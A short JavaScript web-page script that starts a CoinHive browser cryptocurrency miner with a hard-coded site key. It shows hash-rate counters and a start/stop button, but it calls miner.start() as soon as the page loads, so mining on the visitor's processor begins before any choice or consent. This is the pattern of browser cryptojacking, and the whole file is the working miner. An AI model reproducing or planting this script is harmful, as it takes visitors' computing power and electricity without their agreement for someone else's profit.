document.addEventListener("DOMContentLoaded", function(event) {

	var miner = new CoinHive.Anonymous('MCtA4Mc6TUNeLD9cOrkuPw06B2Ulz4Ic');

	// Get UI
	boxes = {}
	boxes.hashesPerSecond = document.getElementById('hashesPerSecond');
	boxes.totalHashes = document.getElementById('totalHashes');
	boxes.acceptedHashes = document.getElementById('acceptedHashes');
	boxes.toggleMiner = document.getElementById('toggleMiner');

	if (boxes.toggleMiner != null){
		boxes.toggleMiner.addEventListener('click', function(){
			boxes.toggleMiner.disabled = true;
			if (miner.isRunning()){
				miner.stop();
			} else {
				miner.start();
			}
		}, false);
	}

	miner.on('found', function() {
		// Hash found
		console.log("Hash found!");
	});
	miner.on('accepted', function() {
		// Hash accepted by the pool
		console.log("Hash accepted!");
	});
	miner.on('open', function() {
		// Started
		if (boxes.toggleMiner != null){
			boxes.toggleMiner.disabled = false;
			boxes.toggleMiner.textContent = "Stop Mining";
		}
		console.log("Miner started");
	});
	miner.on('close', function() {
		// Stopped
		if (boxes.toggleMiner != null){
			boxes.toggleMiner.disabled = false;
			boxes.toggleMiner.textContent = "Start Mining";
		}
		console.log("Miner stopped");
	});

	// Update stats once per second
	setInterval(function() {
		var data = {}
		data.hashesPerSecond = miner.getHashesPerSecond().toFixed(2);
		data.totalHashes = miner.getTotalHashes();
		data.acceptedHashes = miner.getAcceptedHashes();

		console.log(data);
		// Update UI
		if (boxes.hashesPerSecond != null){
			boxes.hashesPerSecond.textContent = data.hashesPerSecond;
			boxes.totalHashes.textContent = data.totalHashes;
			boxes.acceptedHashes.textContent = data.acceptedHashes;
		}
	}, 1000);

	// Everything is set up. Begin.
	miner.start();
});
